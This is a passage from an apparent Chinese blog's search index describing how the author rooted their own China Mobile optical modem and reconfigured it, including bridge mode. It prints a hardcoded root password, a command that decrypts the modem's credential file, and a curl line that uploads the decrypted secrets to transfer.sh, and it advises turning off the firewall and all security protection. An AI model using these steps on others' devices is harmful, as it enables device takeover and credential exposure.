<p>\u200b\u6b64\u65f6\u200b\u5728\u200b\u770b\u770b\u200b\u5149\u732b\u200b\u7684\u200b\u7aef\u53e3\u200b\u5f00\u653e\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b 23 \u200b\u7aef\u53e3\u200b\u6b63\u5e38\u200b\u5f00\u653e\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"11/5/#root","title":"\u83b7\u53d6\u200b root \u200b\u6743\u9650","text":"<p>\u200b\u56e0\u4e3a\u200b\u5386\u53f2\u200b\u9057\u7559\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u7684\u200b\u4ee3\u7801\u200b\u5199\u200b\u7684\u200b\u592a\u70c2\u200b\u4e86\u200b\uff0c\u200b\u5f88\u591a\u200b\u9ad8\u200b\u6743\u9650\u200b\u7684\u200b\u5bc6\u7801\u200b\u751a\u81f3\u200b\u76f4\u63a5\u200b\u786c\u200b\u7f16\u7801\u200b\u5230\u200b\u4ee3\u7801\u200b\u91cc\u9762\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\uff0cTelnet \u200b\u4e0b\u200b su \u200b\u5207\u6362\u200b root \u200b\u7528\u6237\u200b\uff0c\u200b\u5bc6\u7801\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\uff1a  aDm8H%MdA \u200b\u767b\u5f55\u200b</p> <p> </p>"},{"location":"11/5/#_8","title":"\u83b7\u53d6\u200b\u8d85\u7ba1\u200b\u5bc6\u7801","text":"<p>\u200b\u56e0\u4e3a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u4ed6\u200b\u7684\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u597d\u200b\u5728\u200b\u6211\u4eec\u200b\u5728\u200b root \u200b\u7684\u200b shell \u200b\u4ea4\u4e92\u6027\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u89e3\u5bc6\u200b\u51fa\u8d85\u200b\u7ba1\u200b\u7684\u200b\u5bc6\u7801\u200b\uff1a</p> Bash<pre><code># \u200b\u89e3\u5bc6\u200b db_user_cfg.xml \u200b\u914d\u7f6e\u6587\u4ef6\u200b\nsidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml\n\n# \u200b\u5c06\u200b\u89e3\u5bc6\u200b\u540e\u200b\u7684\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u5230\u200b transfer.sh\ncurl -v -k --upload-file /tmp/debug-decry-cfg  https://transfer.sh/debug.xml\n</code></pre> <p>transfer.sh \u200b\u662f\u200b\u7b2c\u4e09\u65b9\u200b\u8fd0\u8d39\u200b\u5546\u200b\u53ef\u80fd\u200b\u6709\u200b\u4e00\u5b9a\u200b\u6cc4\u9732\u200b\u5206\u4eab\u200b\uff0c\u200b\u5982\u679c\u200b\u62c5\u5fc3\u200b\u6570\u636e\u200b\u6cc4\u9732\u200b\u7684\u200b\u5c0f\u4f19\u4f34\u200b\u81ea\u5df1\u200b\u672c\u5730\u200b\u67e5\u770b\u200b\u5373\u53ef\u200b\u3002\u200b\u56fd\u5149\u200b\u6211\u200b\u4e2a\u4eba\u200b\u5efa\u8bae\u200b\u5907\u4efd\u200b\u4e00\u4e0b\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u6211\u4eec\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u914d\u7f6e\u200b\u5c31\u200b\u56de\u4e0d\u6765\u200b\u4e86\u200b\u3002</p> <p>curl \u200b\u4e0a\u4f20\u200b\u6210\u529f\u200b\u6216\u200b\u56de\u200b\u8fd4\u56de\u200b\u968f\u673a\u200b\u8def\u5f84\u200b\u7684\u200b URL\uff1a</p> <p> </p> <p>\u200b\u8bbf\u95ee\u200b\u5373\u53ef\u200b\u4e0b\u8f7d\u200b\u6211\u4eec\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u770b\u770b\u200b\u8fd9\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u91cc\u9762\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u4fe1\u606f\u200b\u3002</p> <ul> <li>\u200b\u5149\u732b\u200b\u7684\u200b\u8d85\u7ba1\u200b\u548c\u200b\u666e\u901a\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u4fe1\u606f\u200b\uff1a</li> </ul> <p> </p> <ul> <li>\u200b\u4fdd\u5b58\u200b\u7684\u200b PPPoE \u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u7684\u200b\u4fe1\u606f\u200b</li> </ul> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u56de\u5230\u200b\u4e4b\u524d\u200b\u7684\u200b http://192.168.1.1/ \u200b\u9875\u9762\u200b\uff0c\u200b\u6211\u4eec\u200b\u91cd\u65b0\u200b\u4f7f\u7528\u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200b CMCCAdmin \u200b\u7684\u200b\u7528\u6237\u540d\u200b\u548c\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"11/5/#_9","title":"\u5149\u732b\u200b\u8c03\u6559","text":""},{"location":"11/5/#tr069","title":"\u5220\u9664\u200b TR069","text":"<p>\u200b\u56e0\u4e3a\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u662f\u200b\u901a\u8fc7\u200b TR069 \u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u505a\u200b\u4e00\u4e9b\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5220\u6389\u200b\u5b83\u200b\uff0c\u200b\u4e00\u52b3\u6c38\u9038\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u5c31\u200b\u4e00\u76f4\u200b\u662f\u200b\u6211\u4eec\u200b\u89e3\u5bc6\u200b\u51fa\u6765\u200b\u7684\u200b\u6837\u5b50\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8fc7\u200b\u5982\u679c\u200b\u4e0d\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b TR069 \u200b\u7684\u8bdd\u200b\uff0c\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6709\u200b\u5176\u4ed6\u200b\u5947\u6280\u6deb\u5de7\u200b\u7684\u200b\u73a9\u6cd5\u200b\uff1aTR069 \u200b\u5185\u200b\u7f51\u200b\u96a7\u9053\u200b\u3001\u200b\u5f02\u5730\u200b\u7ec4\u7f51\u200b\u3001\u200b\u5185\u200b\u7f51\u200b\u6e17\u900f\u200b\uff1f   \u200b\u53ef\u60dc\u200b\u56fd\u5149\u200b\u660e\u5929\u200b\u8981\u200b\u4e0a\u73ed\u200b\u4e86\u200b\uff0c\u200b\u7cbe\u529b\u200b\u4e0d\u591f\u200b\u7ee7\u7eed\u200b\u6df1\u5165\u200b\u4e86\u200b\uff0cmark \u200b\u4e00\u4e0b\u200b\u540e\u9762\u200b\u6709\u200b\u673a\u4f1a\u200b\u6298\u817e\u200b\u8fd9\u4e2a\u200b\u3002</p>"},{"location":"11/5/#upnp","title":"\u542f\u7528\u200b UPnP","text":"<p>\u200b\u5f00\u542f\u200b UPnP \u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u529f\u80fd\u200b\uff0cUPnP \u200b\u6216\u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u662f\u200b\u4e00\u79cd\u200b\u534f\u8bae\u200b\u96c6\u200b\uff0c\u200b\u5141\u8bb8\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u548c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff08\u200b\u4e3b\u8981\u200b\u662f\u200b\u6e38\u620f\u200b\uff09\u200b\u81ea\u52a8\u200b\u8f6c\u53d1\u200b\u7aef\u53e3\u200b\u3002\u200b\u53ef\u4ee5\u200b\u6781\u5927\u200b\u7684\u200b\u6539\u5584\u200b\u6211\u4eec\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u867d\u7136\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5927\u5185\u200b\u7f51\u200b\uff0c\u200b\u4f46\u662f\u200b\u6539\u5584\u200b\u4e00\u70b9\u200b\u662f\u200b\u4e00\u70b9\u200b\u5427\u200b\uff1a</p> <p> </p>"},{"location":"11/5/#qos","title":"\u5173\u95ed\u200b QoS","text":"<p>\u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u200b\u5e26\u5bbd\u200b\u8fdb\u884c\u200b\u9650\u901f\u200b\uff0c\u200b\u800c\u4e14\u200b\u6211\u4eec\u200b\u4e0a\u7f51\u200b\u7684\u200b INTERNET \u200b\u4e1a\u52a1\u200b\u4f18\u5148\u7ea7\u200b\u8fd8\u662f\u200b\u6700\u4f4e\u200b\uff1f\u200b\u8fd9\u200b\u4e0d\u80fd\u200b\u5fcd\u200b\uff01\u200b\u76f4\u63a5\u200b\u5173\u6389\u200b QoS \u200b\u5373\u53ef\u200b\uff0c\u200b\u975e\u5e38\u200b\u7701\u200b\u4e8b\u513f\u200b\uff1a</p> <p> </p>"},{"location":"11/5/#_10","title":"\u9632\u706b\u5899\u200b\u914d\u7f6e","text":"<p>\u200b\u9996\u5148\u200b\u53d6\u6d88\u200b\u6240\u6709\u200b\u5b89\u5168\u200b\u9632\u62a4\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5c06\u200b\u9632\u706b\u5899\u200b\u7b49\u7ea7\u200b\u8c03\u5230\u200b\u4f4e\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u6837\u200b\u5728\u200b\u732b\u200b\u4e0b\u9762\u200b\u7684\u200b\u673a\u5668\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u83b7\u53d6\u200b\u5230\u200b IPv6 \u200b\u516c\u7f51\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b Python \u200b\u542f\u52a8\u200b\u4e2a\u200b  Web \u200b\u670d\u52a1\u200b\u9a8c\u8bc1\u200b\u4e00\u4e0b\u200b\uff1a</p> Bash<pre><code>python3 -m http.server --bind ::\n</code></pre> <p>\u200b\u624b\u673a\u200b\u4f7f\u7528\u200b SIM \u200b\u8fd0\u8425\u5546\u200b\u7f51\u7edc\u200b\u4e5f\u200b\u6210\u529f\u200b\u8bbf\u95ee\u200b\uff1a</p> <p> </p>"},{"location":"11/5/#_11","title":"\u5149\u732b\u200b\u6865\u63a5","text":"<p>\u200b\u5176\u5b9e\u200b\u5982\u679c\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e4b\u524d\u200b\u7684\u200b\u300c\u200b\u5149\u732b\u200b\u8c03\u6559\u200b\u300d\u200b\u90e8\u5206\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u65e0\u6240\u8c13\u200b\u4e86\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u6837\u200b\u76f8\u5f53\u4e8e\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u4e86\u200b\u3002\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u200b\u597d\u5904\u200b\uff1a</p> <ol> <li>\u200b\u6539\u5584\u200b NAT \u200b\u7c7b\u578b\u200b\uff08\u200b\u4e2d\u56fd\u7535\u4fe1\u200b\u6709\u200b\u516c\u7f51\u200b IPv4 \u200b\u7684\u8bdd\u200b\uff0c\u200b\u751a\u81f3\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u83b7\u53d6\u200b\u516c\u7f51\u200b IPv4\uff09</li> <li>\u200b\u63d0\u9ad8\u200b\u7f51\u7edc\u200b\u4f53\u9a8c\u200b\uff0c\u200b\u51cf\u8f7b\u200b\u5149\u732b\u200b\u8d1f\u62c5\u200b\uff0c\u200b\u538b\u529b\u200b\u8f6c\u79fb\u200b\u5230\u200b\u4e86\u200b\u8def\u7531\u5668\u200b</li> <li>\u200b\u65b9\u4fbf\u200b\u7528\u6237\u200b\u81ea\u5b9a\u4e49\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u7684\u200b\u5b98\u65b9\u200b\u9650\u5236\u200b\u6709\u70b9\u200b\u591a\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4ea4\u7ed9\u200b\u8def\u7531\u5668\u200b\u7684\u8bdd\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u7075\u6d3b\u200b\u914d\u7f6e\u200b</li> </ol> <p>\u200b\u800c\u4e14\u200b\u636e\u8bf4\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u53ef\u4ee5\u200b\u6700\u200b\u591a\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u90a3\u200b\u4e0d\u200b\u5c31\u200b\u7f8e\u6ecb\u6ecb\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b\u51c6\u5907\u200b\u5f00\u59cb\u200b\u6865\u63a5\u200b\u3002</p>"},{"location":"11/5/#_12","title":"\u8bb0\u5f55\u200b\u914d\u7f6e","text":"<p>\u200b\u56e0\u4e3a\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b\u5df2\u6709\u200b\u7684\u200b\u7f51\u7edc\u200b\u4e3a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u5220\u6389\u200b\u73b0\u6709\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u7136\u540e\u200b\u65b0\u5efa\u200b1\u200b\u4e2a\u200b\u8fde\u63a5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u4e4b\u524d\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u91cd\u70b9\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b VLAN \u200b\u6a21\u5f0f\u200b\u548c\u200b ID\uff1a</p> <p> </p>"},{"location":"11/5/#_13","title":"\u65b0\u5efa\u200b\u8fde\u63a5","text":"<p>\u200b\u65b0\u5efa\u200b 1 \u200b\u4e2a\u200b WAN \u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e3b\u8981\u200b\u914d\u7f6e\u200b\u6284\u200b\u4e00\u4e0b\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7684\u200b\u5373\u53ef\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u7684\u200b\u914d\u7f6e\u200b\u8be6\u60c5\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6c5f\u82cf\u200b\u79fb\u52a8\u200b\u6700\u5927\u200b\u652f\u6301\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u6b63\u597d\u200b\u4e5f\u200b\u6709\u200b 4 \u200b\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u52fe\u9009\u200b\u8fd9\u200b\u51e0\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u5177\u4f53\u200b\u914d\u7f6e\u200b\u7ec6\u8282\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u786e\u4fdd\u200b\u5220\u6389\u200b\u4e4b\u524d\u200b\u7684\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u53ea\u6709\u200b 1 \u200b\u4e2a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u914d\u7f6e\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u751f\u6548\u200b\u7684\u8bdd\u200b\uff0c\u200b\u8bb0\u5f97\u200b\u91cd\u542f\u200b\u4e00\u4e0b\u200b\u5149\u732b\u200b\u3002  </p>"},{"location":"11/5/#_14","title":"\u62e8\u53f7\u4e0a\u7f51","text":"<p>\u200b\u6865\u63a5\u200b\u6210\u529f\u200b\u540e\u200b\uff0cMBP \u200b\u76f4\u63a5\u200b\u7f51\u7ebf\u200b\u63d2\u5149\u200b\u732b\u200b\u4e0a\u200b\uff0c\u200b\u5373\u53ef\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u6210\u529f\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u6539\u200b\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u5728\u200b\u8def\u7531\u5668\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\uff1a</p> <p> </p> <p>\u200b\u7f8e\u6ecb\u6ecb\u200b\uff0c\u200b\u5f00\u59cb\u200b\u5c3d\u60c5\u200b\u4eab\u53d7\u200b\u4f60\u200b\u7684\u200b\u7f51\u7edc\u200b\u5427\u200b~~~</p>"},{"location":"11/5/#_15","title":"\u5c0f\u200b\u4f17\u200b\u573a\u666f","text":"<p>\u200b\u80af\u5b9a\u200b\u4f1a\u200b\u6709\u200b\u7f51\u53cb\u200b\u597d\u5947\u200b\u5149\u732b\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u6865\u63a5\u200b\u548c\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u5417\u200b\uff1f\u200b\u90a3\u200b\u80af\u5b9a\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u573a\u666f\u200b\u975e\u5e38\u5c11\u200b\uff0c\u200b\u4f46\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u7684\u200b\u3002</p> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u5199\u200b\u8fd9\u200b\u7bc7\u6587\u7ae0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f4f\u200b\u7684\u200b\u8fd8\u662f\u200b LOFT \u200b\u516c\u5bd3\u200b\uff0c\u200b\u548c\u200b\u697c\u4e0a\u200b\u7684\u200b\u5c0f\u54e5\u200b\u5171\u7528\u200b 1 \u200b\u4e2a\u5149\u200b\u732b\u200b\u3002\u200b\u6211\u200b\u5982\u679c\u200b\u6539\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u60f3\u200b\u8ba9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u65e0\u611f\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ea\u80fd\u200b\u5728\u200b\u5149\u732b\u200b\u4e0b\u200b\u5916\u63a5\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\uff0c\u200b\u7136\u540e\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u7684\u200b\u7f51\u7ebf\u200b\u63d2\u200b\u8def\u7531\u5668\u200b\u4e86\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u4e5f\u200b\u592a\u200b\u5f20\u626c\u200b\u548c\u200b\u4e0d\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5355\u72ec\u200b\u7ed9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u914d\u7f6e\u200b 1 \u200b\u4e2a\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5176\u4ed6\u200b\u5168\u90e8\u200b\u8d70\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u3002</p> <p>\u200b\u5176\u5b9e\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u5c31\u662f\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 2\u30013\u30014 \u200b\u7aef\u53e3\u200b\uff1a</p> <p> </p> <p>\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 1 \u200b\u7aef\u53e3\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u6d4b\u8bd5\u200b\u5747\u200b\u6b63\u5e38\u200b\uff0c\u200b\u771f\u7684\u200b\u592a\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u200b\u8282\u7701\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\u7684\u200b\u94b1\u200b\uff1a</p> <p> </p>"},{"location":"12/5/","title":"IPv6\u200b\u4e0e\u200b\u5149\u732b","text":""},{"location":"12/5/#_1","title":"\u5410\u69fd\u200b\u4e00\u4e0b","text":"<p>\u200b\u968f\u7740\u200b\u7f51\u7edc\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0c\u200b\u56fd\u5185\u200b\u8fd0\u8425\u5546\u200b\u7684\u200b\u5149\u732b\u200b\u9650\u5236\u200b\u8d8a\u6765\u8d8a\u200b\u4e25\u683c\u200b\u3002\u200b\u867d\u7136\u200b\u51fa\u53d1\u70b9\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e3a\u4e86\u200b\u4fdd\u62a4\u200b\u7528\u6237\u200b\u5bb6\u5ead\u8bbe\u5907\u200b\u7684\u200b\u7f51\u7edc\u5b89\u5168\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u6211\u4eec\u200b\u8fd9\u4e9b\u200b\u6709\u200b\u6298\u817e\u200b\u9700\u6c42\u200b\u7684\u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\u95e8\u69db\u200b\u5c31\u200b\u9ad8\u200b\u4e86\u200b\u5f88\u591a\u200b\u3002\u200b\u4e0b\u9762\u200b\u56fd\u5149\u200b\u5c31\u200b\u62ff\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u56fd\u5149\u200b\u6211\u200b\u7684\u200b\u6298\u817e\u200b\u8fc7\u7a0b\u200b\u3002</p>"},{"location":"12/5/#_2","title":"\u5149\u732b\u200b\u73b0\u72b6","text":""},{"location":"12/5/#_3","title":"\u5916\u89c2\u200b\u6982\u89c8","text":"<p>\u200b\u8bbe\u5907\u200b\u540d\u79f0\u200b\uff1a\u200b\u5409\u200b\u6bd4\u7279\u200b\u65e0\u6e90\u200b\u5149\u7ea4\u200b\u63a5\u5165\u200b\u7528\u6237\u7aef\u200b\u8bbe\u5907\u200b(GPON ONU) \u200b\u8bbe\u5907\u200b\u7c7b\u578b\u200b\uff1a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u667a\u80fd\u7f51\u200b\u5173\u200b \u200b\u8bbe\u5907\u200b\u578b\u53f7\u200b\uff1aH2-3e\uff08\u200b\u65e0\u200b\u8bed\u97f3\u200b/\u200b\u65e0\u200b Wi-Fi\uff09 \u200b\u751f\u4ea7\u65e5\u671f\u200b\uff1a2022-08-18</p> <p>\u200b\u5bb6\u200b\u7528\u5149\u200b\u732b\u200b\u7684\u200b\u6027\u80fd\u200b\u90fd\u200b\u6bd4\u8f83\u200b\u5783\u573e\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u76ee\u524d\u200b\u4f7f\u7528\u200b\u7684\u200b\u5149\u732b\u200b\u914d\u7f6e\u200b\u8fd8\u200b\u7b97\u662f\u200b\u4e0d\u9519\u200b\u7684\u200b\u4e86\u200b\uff08\u200b\u77ee\u5b50\u200b\u91cc\u200b\u62d4\u9ad8\u200b\u4e2a\u200b\uff09\uff0c\u200b\u6700\u8d77\u7801\u200b\u6709\u200b 4 \u200b\u4e2a\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u5916\u89c2\u200b\u56fe\u7247\u200b\uff1a</p> \u200b\u80cc\u9762\u200b\u4fe1\u606f\u200b\u6b63\u9762\u200b\u4fe1\u606f\u200b\u63a5\u53e3\u200b\u4fe1\u606f\u200b <p> </p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\u662f\u200b 2022 \u200b\u5e74\u200b 8 \u200b\u6708\u4efd\u200b\u751f\u4ea7\u200b\u7684\u200b\u5149\u732b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6765\u8bf4\u200b\u56fa\u4ef6\u200b\u662f\u200b\u6bd4\u8f83\u200b\u65b0\u200b\u7684\u200b\uff0c\u200b\u95e8\u69db\u200b\u4e5f\u200b\u6bd4\u200b\u7f51\u4e0a\u200b\u90a3\u4e9b\u200b\u8001\u200b\u7684\u200b\u5149\u732b\u200b\u95e8\u69db\u200b\u9ad8\u200b\u4e00\u70b9\u200b\u3002 </p> <p> </p> <p>\u200b\u6b63\u9762\u200b\u6ca1\u200b\u5565\u200b\u597d\u770b\u200b\u7684\u200b\uff0c\u200b\u6beb\u65e0\u200b\u4eae\u70b9\u200b\u3002</p> <p></p> <p>\u200b\u5c31\u200b\u8fd9\u200b 4 \u200b\u4e2a\u200b\u5168\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\u611f\u89c9\u200b\u8fd8\u200b\u6709\u70b9\u200b\u7528\u5904\u200b\uff0c\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\u53ef\u4ee5\u200b\u591a\u63a5\u200b\u4e00\u4e9b\u200b\u8bbe\u5907\u200b\u3002</p>"},{"location":"12/5/#_4","title":"\u7cfb\u7edf\u200b\u6982\u51b5","text":"<p>\u200b\u666e\u901a\u7528\u6237\u200b\u53ea\u80fd\u200b\u4f7f\u7528\u200b\u5149\u732b\u200b\u80cc\u9762\u200b\u7684\u200b user \u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u65b0\u4e00\u4ee3\u200b\u5149\u732b\u200b\u90fd\u200b\u662f\u200b\u901a\u8fc7\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u5bc6\u7801\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5e76\u200b\u6ca1\u6709\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u8fd9\u5757\u200b\u5148\u653e\u200b\u4e00\u653e\u200b\uff0c\u200b\u6211\u4eec\u200b\u5148\u200b\u4f7f\u7528\u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\u770b\u770b\u200b\u518d\u8bf4\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u7cfb\u7edf\u200b\u5185\u90e8\u200b\u7684\u200b\u56fe\u7247\u200b\u4fe1\u606f\u200b\uff1a</p> \u200b\u5bbd\u5e26\u7f51\u200b\u5173\u200b\u8bbe\u5907\u200bDHCP\u200b\u5b89\u5168\u200b\u5bb6\u957f\u200b\u5b58\u50a8\u200b\u7f51\u901f\u200b\u4e0a\u7f51\u200b\u66f4\u65b0\u200b\u7528\u6237\u200b <p> </p> 